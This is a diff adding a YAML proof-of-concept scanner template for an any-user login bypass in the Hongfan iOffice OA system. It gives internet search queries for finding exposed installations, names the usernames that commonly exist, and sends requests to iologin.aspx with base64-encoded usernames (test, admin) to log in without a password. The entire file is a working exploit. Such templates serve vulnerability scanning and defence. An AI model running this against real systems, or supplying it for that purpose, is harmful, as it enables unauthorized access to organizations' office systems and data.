@@ -1,0 +1,72 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: 一般存在的用户为 test 和 admin 和 TEST 以及 ADMIN
+
+name: poc-yaml-hongfan-iologin.aspx-anyuser-login
+transport: http
+set:
+  s1: randomInt(1000000000, 9000000000)
+  s2: randomLowercase(8)
+  t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /iOffice/prg/interface/iologin.aspx?iempcode=dGVzdA==&reurl=1
+      follow_redirects: false
+      headers:
+      body: 
+    expression: >-
+      response.status == 302 &&  response.body_string.contains("iologin.aspx") &&  response.body_string.contains("xmlns")
+
+    output:
+      search: |-
+        "(?P<path>.+)/webapps".bsubmatch(response.body)
+      path: search["path"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /iOffice/prg/interface/iologin.aspx?iempcode=YWRtaW4=&reurl=1
+      follow_redirects: false
+      headers:
+      body: 
+    expression: >-
+      response.status == 302 &&  response.body_string.contains("iologin.aspx") &&  response.body_string.contains("xmlns")
+
+  r2:
+    request:
+      method: GET
+      cache: true
+      path: /iOffice/prg/interface/iologin.aspx?iempcode=QURNSU4=&reurl=1
+      follow_redirects: false
+      headers:
+      body: 
+    expression: >-
+      response.status == 302 &&  response.body_string.contains("iologin.aspx") &&  response.body_string.contains("xmlns")
+
+  r3:
+    request:
+      method: GET
+      cache: true
+      path: /iOffice/prg/interface/iologin.aspx?iempcode=VEVTVA==&reurl=1
+      follow_redirects: false
+      headers:
+      body: 
+    expression: >-
+      response.status == 302 &&  response.body_string.contains("iologin.aspx") &&  response.body_string.contains("xmlns")
+
+expression: r0() || r1() || r2() || r3()
